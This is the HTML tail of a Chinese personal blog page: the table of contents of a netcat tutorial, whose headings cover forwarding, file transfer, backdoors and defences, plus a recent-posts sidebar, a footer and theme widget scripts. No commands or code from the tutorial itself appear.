class="toc-number">1.8.2.</span> <span class="toc-text">◇方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%97%87%E8%A1%A5%E5%85%85%E8%AF%B4%E6%98%8E%EF%BC%9A%E5%BB%B6%E6%97%B6%E9%80%80%E5%87%BA"><span class="toc-number">1.8.3.</span> <span class="toc-text">◇补充说明：延时退出</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%97%87%E8%A1%A5%E5%85%85%E8%AF%B4%E6%98%8E%EF%BC%9ATor-%E6%9A%97%E7%BD%91%E7%9A%84%E5%A5%BD%E5%A4%84"><span class="toc-number">1.8.4.</span> <span class="toc-text">◇补充说明：Tor 暗网的好处</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%97%87%E8%A1%A5%E5%85%85%E8%AF%B4%E6%98%8E%EF%BC%9A%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90"><span class="toc-number">1.8.5.</span> <span class="toc-text">◇补充说明：域名解析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%97%87%E8%A1%A5%E5%85%85%E8%AF%B4%E6%98%8E%EF%BC%9A%E8%AE%BE%E7%BD%AE%E5%88%AB%E5%90%8D%EF%BC%88alias%EF%BC%89"><span class="toc-number">1.8.6.</span> <span class="toc-text">◇补充说明：设置别名（alias）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%98%85%E6%8B%9B%E6%95%B05%EF%BC%9A%EF%BC%88%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%EF%BC%89%E7%94%A8-nc-%E6%8E%A2%E6%B5%8B%E2%80%9C%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%B1%BB%E5%9E%8B%E2%80%9D%E5%92%8C%E2%80%9C%E8%BD%AF%E4%BB%B6%E7%89%88%E6%9C%AC%E2%80%9D%EF%BC%88%E4%BB%A5-SSH-%E4%B8%BA%E4%BE%8B%EF%BC%89"><span class="toc-number">1.9.</span> <span class="toc-text">★招数5：（信息收集）用 nc 探测“服务器类型”和“软件版本”（以 SSH 为例）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%97%87%E4%BD%BF%E7%94%A8%E5%9C%BA%E6%99%AF-4"><span class="toc-number">1.9.1.</span> <span class="toc-text">◇使用场景</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%97%87%E6%96%B9%E6%B3%95-4"><span class="toc-number">1.9.2.</span> <span class="toc-text">◇方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%97%87%E8%A1%A5%E5%85%85%E8%AF%B4%E6%98%8E%EF%BC%9Aecho-%E5%91%BD%E4%BB%A4"><span class="toc-number">1.9.3.</span> <span class="toc-text">◇补充说明：echo 命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%97%87%E8%A1%A5%E5%85%85%E8%AF%B4%E6%98%8E%EF%BC%9A%E6%89%B9%E5%A4%84%E7%90%86-%EF%BC%86-%E8%87%AA%E5%8A%A8%E5%8C%96"><span class="toc-number">1.9.4.</span> <span class="toc-text">◇补充说明：批处理 ＆ 自动化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%97%87%E8%A1%A5%E5%85%85%E8%AF%B4%E6%98%8E%EF%BC%9A%E9%98%B2%E8%8C%83%E6%8E%AA%E6%96%BD"><span class="toc-number">1.9.5.</span> <span class="toc-text">◇补充说明：防范措施</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%98%85%E6%8B%9B%E6%95%B06%EF%BC%9A%EF%BC%88%E9%9A%90%E5%8C%BF%E6%80%A7%EF%BC%89%E7%94%A8-nc-%E5%AE%9E%E7%8E%B0%E3%80%90%E5%BD%BB%E5%BA%95%E6%97%A0%E7%97%95%E3%80%91%E7%9A%84-Web-%E8%AE%BF%E9%97%AE"><span class="toc-number">1.10.</span> <span class="toc-text">★招数6：（隐匿性）用 nc 实现【彻底无痕】的 Web 访问</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%97%87%E4%BD%BF%E7%94%A8%E5%9C%BA%E6%99%AF-5"><span class="toc-number">1.10.1.</span> <span class="toc-text">◇使用场景</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%97%87%E6%96%B9%E6%B3%95-5"><span class="toc-number">1.10.2.</span> <span class="toc-text">◇方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%97%87%E8%A1%A5%E5%85%85%E8%AF%B4%E6%98%8E%EF%BC%9AHTTP-%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.10.3.</span> <span class="toc-text">◇补充说明：HTTP 协议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%97%87%E8%A1%A5%E5%85%85%E8%AF%B4%E6%98%8E%EF%BC%9A%E8%BF%99%E7%A7%8D%E6%96%B9%E5%BC%8F%E7%9A%84%E3%80%90%E7%BC%BA%E7%82%B9%E3%80%91"><span class="toc-number">1.10.4.</span> <span class="toc-text">◇补充说明：这种方式的【缺点】</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%98%85%E6%8B%9B%E6%95%B07%EF%BC%9A%EF%BC%88%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE%EF%BC%89%E5%9F%BA%E4%BA%8E-nc-%E7%9A%84%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%EF%BC%88Port-Forward%EF%BC%89"><span class="toc-number">1.11.</span> <span class="toc-text">★招数7：（网络配置）基于 nc 的端口转发（Port Forward）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%97%87%E4%BD%BF%E7%94%A8%E5%9C%BA%E6%99%AF-6"><span class="toc-number">1.11.1.</span> <span class="toc-text">◇使用场景</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%97%87%E5%8E%9F%E7%90%86"><span class="toc-number">1.11.2.</span> <span class="toc-text">◇原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%97%87%E6%96%B9%E6%B3%95-6"><span class="toc-number">1.11.3.</span> <span class="toc-text">◇方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%97%87%E8%A1%A5%E5%85%85%E8%AF%B4%E6%98%8E%EF%BC%9A%E5%A6%82%E4%BD%95%E8%AE%A9-nc-%E7%9A%84%E7%9B%91%E5%90%AC%E7%AB%AF%E5%8F%A3%E3%80%90%E6%8C%81%E7%BB%AD%E5%BC%80%E5%90%AF%E3%80%91-1"><span class="toc-number">1.11.4.</span> <span class="toc-text">◇补充说明：如何让 nc 的监听端口【持续开启】</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%98%85%E6%8B%9B%E6%95%B08%EF%BC%9A%EF%BC%88%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE%EF%BC%89%E5%9F%BA%E4%BA%8E-nc-%E7%9A%84%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91%EF%BC%88Proxy-Forward%EF%BC%89"><span class="toc-number">1.12.</span> <span class="toc-text">★招数8：（网络配置）基于 nc 的代理转发（Proxy Forward）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%97%87%E4%BD%BF%E7%94%A8%E5%9C%BA%E6%99%AF-7"><span class="toc-number">1.12.1.</span> <span class="toc-text">◇使用场景</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%97%87%E6%96%B9%E6%B3%95-7"><span class="toc-number">1.12.2.</span> <span class="toc-text">◇方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%97%87%E8%A1%A5%E5%85%85%E8%AF%B4%E6%98%8E%EF%BC%9A%E2%80%9CSSH-over-Tor%E2%80%9D%E4%B8%8E%E2%80%9CTor-over-SSH%E2%80%9D"><span class="toc-number">1.12.3.</span> <span class="toc-text">◇补充说明：“SSH over Tor”与“Tor over SSH”</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%98%85%E6%8B%9B%E6%95%B09%EF%BC%9A%EF%BC%88%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86%EF%BC%89%E7%94%A8-nc-%E4%BC%A0%E8%BE%93%E6%96%87%E4%BB%B6"><span class="toc-number">1.13.</span> <span class="toc-text">★招数9：（系统管理）用 nc 传输文件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%97%87%E4%BD%BF%E7%94%A8%E5%9C%BA%E6%99%AF-8"><span class="toc-number">1.13.1.</span> <span class="toc-text">◇使用场景</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%97%87%E6%96%B9%E6%B3%95-8"><span class="toc-number">1.13.2.</span> <span class="toc-text">◇方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%97%87%E8%A1%A5%E5%85%85%E8%AF%B4%E6%98%8E%EF%BC%9Anc-%E7%9A%84%E6%80%A7%E8%83%BD%E4%BC%98%E5%8A%BF"><span class="toc-number">1.13.3.</span> <span class="toc-text">◇补充说明：nc 的性能优势</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%98%85%E6%8B%9B%E6%95%B010%EF%BC%9A%EF%BC%88%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86%EF%BC%89%E7%94%A8-nc-%E8%BF%9C%E7%A8%8B%E5%A4%87%E4%BB%BD%E6%95%B4%E4%B8%AA%E7%A3%81%E7%9B%98"><span class="toc-number">1.14.</span> <span class="toc-text">★招数10：（系统管理）用 nc 远程备份整个磁盘</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%97%87%E4%BD%BF%E7%94%A8%E5%9C%BA%E6%99%AF-9"><span class="toc-number">1.14.1.</span> <span class="toc-text">◇使用场景</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%97%87%E5%8E%9F%E7%90%86-1"><span class="toc-number">1.14.2.</span> <span class="toc-text">◇原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%97%87%E6%96%B9%E6%B3%95-9"><span class="toc-number">1.14.3.</span> <span class="toc-text">◇方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%97%87%E8%A1%A5%E5%85%85%E8%AF%B4%E6%98%8E%EF%BC%9Anc-%E7%9A%84%E6%80%A7%E8%83%BD%E4%BC%98%E5%8A%BF-1"><span class="toc-number">1.14.4.</span> <span class="toc-text">◇补充说明：nc 的性能优势</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%98%85%E6%8B%9B%E6%95%B011%EF%BC%9A%EF%BC%88%E5%85%A5%E4%BE%B5%E6%89%8B%E6%B3%95%EF%BC%89%E7%94%A8-nc-%E5%BC%80%E5%90%AF%E3%80%90%E8%A2%AB%E5%8A%A8%E3%80%91%E8%BF%9E%E6%8E%A5%E5%9E%8B%E5%90%8E%E9%97%A8"><span class="toc-number">1.15.</span> <span class="toc-text">★招数11：（入侵手法）用 nc 开启【被动】连接型后门</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%97%87%E4%BD%BF%E7%94%A8%E5%9C%BA%E6%99%AF-10"><span class="toc-number">1.15.1.</span> <span class="toc-text">◇使用场景</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%97%87%E5%8E%9F%E7%90%86-2"><span class="toc-number">1.15.2.</span> <span class="toc-text">◇原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%97%87%E5%85%A5%E4%BE%B5%E6%96%B9%E6%B3%95"><span class="toc-number">1.15.3.</span> <span class="toc-text">◇入侵方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%97%87%E8%A1%A5%E5%85%85%E8%AF%B4%E6%98%8E%EF%BC%9A-e-%E9%80%89%E9%A1%B9"><span class="toc-number">1.15.4.</span> <span class="toc-text">◇补充说明：-e 选项</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%97%87%E3%80%90%E4%B8%8D%E5%A4%9F%E3%80%91%E9%9D%A0%E8%B0%B1%E7%9A%84%E9%98%B2%E8%8C%83%E6%8E%AA%E6%96%BD"><span class="toc-number">1.15.5.</span> <span class="toc-text">◇【不够】靠谱的防范措施</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%97%87%E3%80%90%E9%9D%A0%E8%B0%B1%E3%80%91%E7%9A%84%E9%98%B2%E8%8C%83%E6%8E%AA%E6%96%BD%E2%80%94%E2%80%94NAT-%E6%A8%A1%E5%BC%8F%E7%9A%84%E8%99%9A%E6%8B%9F%E6%9C%BA%EF%BC%88Guest-OS%EF%BC%89"><span class="toc-number">1.15.6.</span> <span class="toc-text">◇【靠谱】的防范措施——NAT 模式的虚拟机（Guest OS）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%97%87%E8%A1%A5%E5%85%85%E8%AF%B4%E6%98%8E%EF%BC%9A%E2%80%9CNAT-%E6%A8%A1%E5%BC%8F%E2%80%9D%E5%A6%82%E4%BD%95%E6%90%AD%E9%85%8D%E2%80%9C%E7%B3%BB%E7%BB%9F%E9%98%B2%E7%81%AB%E5%A2%99%E2%80%9D%EF%BC%9F"><span class="toc-number">1.15.7.</span> <span class="toc-text">◇补充说明：“NAT 模式”如何搭配“系统防火墙”？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%98%85%E6%8B%9B%E6%95%B012%EF%BC%9A%EF%BC%88%E5%85%A5%E4%BE%B5%E6%89%8B%E6%B3%95%EF%BC%89%E7%94%A8-nc-%E5%BC%80%E5%90%AF%E3%80%90%E4%B8%BB%E5%8A%A8%E3%80%91%E8%BF%9E%E6%8E%A5%E5%9E%8B%E5%90%8E%E9%97%A8"><span class="toc-number">1.16.</span> <span class="toc-text">★招数12：（入侵手法）用 nc 开启【主动】连接型后门</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%97%87%E4%BD%BF%E7%94%A8%E5%9C%BA%E6%99%AF-11"><span class="toc-number">1.16.1.</span> <span class="toc-text">◇使用场景</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%97%87%E5%8E%9F%E7%90%86-3"><span class="toc-number">1.16.2.</span> <span class="toc-text">◇原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%97%87%E5%85%A5%E4%BE%B5%E6%96%B9%E6%B3%95-1"><span class="toc-number">1.16.3.</span> <span class="toc-text">◇入侵方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%97%87%E6%AF%94%E2%80%9CNAT-%E6%A8%A1%E5%BC%8F%E2%80%9D%E6%9B%B4%E4%BF%9D%E9%99%A9%E7%9A%84%E6%98%AF%E2%80%94%E2%80%94%E3%80%90%E9%9A%94%E7%A6%BB%E6%A8%A1%E5%BC%8F%E3%80%91%E7%9A%84%E8%99%9A%E6%8B%9F%E6%9C%BA"><span class="toc-number">1.16.4.</span> <span class="toc-text">◇比“NAT 模式”更保险的是——【隔离模式】的虚拟机</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%97%87%E2%80%9C%E3%80%90%E4%B8%BB%E5%8A%A8%E3%80%91%E8%BF%9E%E6%8E%A5%E5%9E%8B%E5%90%8E%E9%97%A8%E2%80%9D%E7%9A%84%E4%BC%98%E5%8A%BF%E4%B9%8B%E5%A4%84%EF%BC%88%E5%8D%B1%E9%99%A9%E6%80%A7%E4%B9%8B%E5%A4%84%EF%BC%89"><span class="toc-number">1.16.5.</span> <span class="toc-text">◇“【主动】连接型后门”的优势之处（危险性之处）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%98%85%E9%99%84%E5%BD%95%EF%BC%9Anetcat-%E7%9A%84%E3%80%90%E5%85%B6%E5%AE%83%E5%8F%98%E7%A7%8D%E3%80%91"><span class="toc-number">1.17.</span> <span class="toc-text">★附录：netcat 的【其它变种】</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%97%87GNU-netcat"><span class="toc-number">1.17.1.</span> <span class="toc-text">◇GNU netcat</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%97%87ncat"><span class="toc-number">1.17.2.</span> <span class="toc-text">◇ncat</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%97%87socat"><span class="toc-number">1.17.3.</span> <span class="toc-text">◇socat</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%97%87Cryptcat"><span class="toc-number">1.17.4.</span> <span class="toc-text">◇Cryptcat</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%97%87sbd"><span class="toc-number">1.17.5.</span> <span class="toc-text">◇sbd</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%97%87netrw"><span class="toc-number">1.17.6.</span> <span class="toc-text">◇netrw</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/08/02/Butterfly%E8%A3%85%E4%BF%AE%E4%B9%8B%E6%96%B0%E6%89%8B%E4%B8%8A%E8%B7%AF/" title="Butterfly装修之新手上路"><img src="https://cdn.jsdelivr.net/gh/jerryc127/CDN/img/butterfly-docs-01-cover.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Butterfly装修之新手上路"/></a><div class="content"><a class="title" href="/2021/08/02/Butterfly%E8%A3%85%E4%BF%AE%E4%B9%8B%E6%96%B0%E6%89%8B%E4%B8%8A%E8%B7%AF/" title="Butterfly装修之新手上路">Butterfly装修之新手上路</a><time datetime="2021-08-02T10:34:41.000Z" title="发表于 2021-08-02 18:34:41">2021-08-02</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/08/01/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%8B%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95-%E4%B8%80/" title="数据结构之排序算法(一)"><img src="/images/%E5%B0%81%E9%9D%A2/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%8B%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95%EF%BC%88%E4%B8%80%EF%BC%89.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="数据结构之排序算法(一)"/></a><div class="content"><a class="title" href="/2021/08/01/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%8B%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95-%E4%B8%80/" title="数据结构之排序算法(一)">数据结构之排序算法(一)</a><time datetime="2021-08-01T15:22:44.000Z" title="发表于 2021-08-01 23:22:44">2021-08-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/08/01/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1%E4%B9%8B%E5%A4%A7%E7%88%B1%E7%BA%BF%E6%80%A7%E8%A1%A8/" title="数据结构课程设计之大爱线性表"><img src="/images/%E5%B0%81%E9%9D%A2/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1%E4%B9%8B%E5%A4%A7%E7%88%B1%E7%BA%BF%E6%80%A7%E8%A1%A8.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="数据结构课程设计之大爱线性表"/></a><div class="content"><a class="title" href="/2021/08/01/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1%E4%B9%8B%E5%A4%A7%E7%88%B1%E7%BA%BF%E6%80%A7%E8%A1%A8/" title="数据结构课程设计之大爱线性表">数据结构课程设计之大爱线性表</a><time datetime="2021-08-01T15:21:39.000Z" title="发表于 2021-08-01 23:21:39">2021-08-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/08/01/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1%E4%B9%8B%E5%8D%95%E8%AF%8D%E6%A3%80%E6%9F%A5/" title="数据结构课程设计之单词检查"><img src="/images/%E5%B0%81%E9%9D%A2/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1%E4%B9%8B%E5%8D%95%E8%AF%8D%E6%A3%80%E6%9F%A5.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="数据结构课程设计之单词检查"/></a><div class="content"><a class="title" href="/2021/08/01/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1%E4%B9%8B%E5%8D%95%E8%AF%8D%E6%A3%80%E6%9F%A5/" title="数据结构课程设计之单词检查">数据结构课程设计之单词检查</a><time datetime="2021-08-01T15:20:50.000Z" title="发表于 2021-08-01 23:20:50">2021-08-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/08/01/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%8B%E5%8D%95%E9%93%BE%E8%A1%A8%E7%9A%84%E5%88%9B%E5%BB%BA%E5%92%8C%E9%80%86%E8%BD%AC/" title="数据结构之单链表的创建和逆转"><img src="/images/%E5%B0%81%E9%9D%A2/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%8B%E5%8D%95%E9%93%BE%E8%A1%A8%E7%9A%84%E5%88%9B%E5%BB%BA%E5%92%8C%E9%80%86%E8%BD%AC.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="数据结构之单链表的创建和逆转"/></a><div class="content"><a class="title" href="/2021/08/01/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%8B%E5%8D%95%E9%93%BE%E8%A1%A8%E7%9A%84%E5%88%9B%E5%BB%BA%E5%92%8C%E9%80%86%E8%BD%AC/" title="数据结构之单链表的创建和逆转">数据结构之单链表的创建和逆转</a><time datetime="2021-08-01T15:18:58.000Z" title="发表于 2021-08-01 23:18:58">2021-08-01</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By 胡小宁</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="algolia-search"><div class="search-dialog"><div class="search-dialog__title" id="algolia-search-title">Algolia</div><div id="algolia-input-panel"><div id="algolia-search-input"></div></div><hr/><div id="algolia-search-results"><div id="algolia-hits"></div><div id="algolia-pagination"></div><div id="algolia-stats"></div></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/search/algolia.js"></script><div class="js-pjax"></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><!-- hexo injector body_end start --><script data-pjax>function electric_clock_injector_config(){
                var parent_div_git = document.getElementsByClassName('sticky_layout')[0];
                var item_html = '<div class="card-widget card-clock"><div class="card-glass"><div class="card-background"><div class="card-content"><div id="hexo_electric_clock"><img id="card-clock-loading" src="https://cdn.jsdelivr.net/gh/Zfour/Butterfly-clock/clock/images/weather/loading.gif" style="height: 120px; width: 100%;" data-ll-status="loading" class="entered loading"></div></div></div></div></div>';
                console.log('已挂载electric_clock')
                // parent_div_git.innerHTML=item_html+parent_div_git.innerHTML // 无报错，但不影响使用(支持pjax跳转)
                parent_div_git.insertAdjacentHTML("afterbegin",item_html) // 有报错，但不影响使用(支持pjax跳转)
            }if( document.getElementsByClassName('sticky_layout')[0] && (location.pathname ==='all'|| 'all' ==='all')){

            electric_clock_injector_config()
        } </script><script src="https://pv.sohu.com/cityjson?ie=utf-8"></script><script data-pjax  src="https://cdn.jsdelivr.net/gh/Zfour/hexo-electric-clock@1.0.6/clock.js"></script><!-- hexo injector body_end end --></body></html>